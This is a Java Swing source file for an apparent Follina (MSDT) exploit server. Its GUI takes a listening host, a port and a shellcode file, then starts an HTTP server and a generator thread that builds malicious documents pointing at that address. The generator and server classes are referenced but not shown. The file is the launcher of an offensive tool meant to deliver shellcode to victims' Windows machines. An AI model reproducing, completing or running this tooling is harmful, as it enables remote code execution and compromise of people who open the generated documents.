package follina.server;

import java.awt.BorderLayout;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;

import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.filechooser.FileSystemView;

import follina.server.http.ServerHTTP;

public class Anunnaki {

	// Principal Variable
	public static int PORT = 8080;
	public static String ShellcodePath = "";
	public static String Address = "";
	public static String networkInterface = "";

	private JFrame frame;
	private JTextField shellcode;
	private JTextField port;
	private JTextField hostAddress;

	// Threads
	Thread serverTask = null;
	Thread generated = null;

	private boolean on = false;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Anunnaki window = new Anunnaki();
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public Anunnaki() {
		initialize();
	}

	private void loadData() {
		ShellcodePath = shellcode.getText();
		PORT = Integer.parseInt(port.getText());
		Address = hostAddress.getText();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frame = new JFrame();
		frame.setBounds(100, 100, 831, 448);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

		JPanel panel = new JPanel();
		frame.getContentPane().add(panel, BorderLayout.CENTER);
		panel.setLayout(null);

		JLabel lblInterface = new JLabel("Interface");
		lblInterface.setBounds(108, 51, 70, 15);
		panel.add(lblInterface);

		JLabel lblHost = new JLabel("Host");
		lblHost.setBounds(108, 106, 70, 15);
		panel.add(lblHost);

		JLabel lblPort = new JLabel("Port");
		lblPort.setBounds(108, 156, 70, 15);
		panel.add(lblPort);

		JLabel lblShellcode = new JLabel("Shellcode");
		lblShellcode.setBounds(108, 206, 70, 15);
		panel.add(lblShellcode);

		shellcode = new JTextField();
		shellcode.setBounds(264, 198, 234, 26);
		panel.add(shellcode);
		shellcode.setColumns(10);

		port = new JTextField();
		port.setBounds(264, 151, 234, 26);
		panel.add(port);
		port.setColumns(10);

		hostAddress = new JTextField();
		hostAddress.setBounds(264, 104, 234, 26);
		panel.add(hostAddress);
		hostAddress.setColumns(10);

		JButton browseBtn = new JButton("Browse");
		browseBtn.setBounds(525, 196, 141, 34);
		panel.add(browseBtn);
		browseBtn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {

				JFileChooser fileChooser = new JFileChooser(FileSystemView.getFileSystemView().getHomeDirectory());
				fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
				int res = fileChooser.showOpenDialog(null);
				if (res == JFileChooser.APPROVE_OPTION) {
					File file = fileChooser.getSelectedFile();
					shellcode.setText(file.getAbsolutePath());
				}
			}
		});

		JButton btnStart = new JButton("Start Server");
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if (!on) {
					loadData();
					serverTask = new Thread(ServerHTTP.getInstance());
					generated = new Thread(new FollinaGenerater("http://" + Address + ":" + PORT));
					serverTask.start();
					generated.start();
					btnStart.setName("Stop Server");
					on = true;
				} else {
					serverTask.interrupt();
					generated.interrupt();
					btnStart.setName("Start Server");
				}
			}
		});
		btnStart.setBounds(264, 243, 234, 63);
		panel.add(btnStart);

		JComboBox interfaceCombobox = new JComboBox();
		interfaceCombobox.setBounds(264, 46, 234, 24);
		panel.add(interfaceCombobox);
	}
}
